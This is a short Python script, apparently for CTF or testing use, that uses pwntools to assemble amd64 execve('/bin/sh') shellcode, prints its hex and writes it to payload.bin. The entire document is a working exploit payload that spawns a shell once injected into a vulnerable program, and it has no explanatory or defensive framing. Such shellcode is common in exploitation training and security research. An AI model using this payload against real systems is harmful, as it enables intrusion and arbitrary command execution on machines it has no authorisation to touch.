from pwn import *

context.arch = 'amd64'  # Set architecture to amd64

# Create the shellcode
shellcode = asm(
    '''
    xor rax, rax
    push rax
    mov rdi, 0x68732f6e69622f2f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov al, 0x3b
    syscall
    '''
)

# Output the shellcode in a hex format that can be used in CTFs or testing
print(f"Shellcode: {shellcode.hex()}")

# Write the shellcode directly to a binary file
with open('payload.bin', 'wb') as f:
    f.write(shellcode)
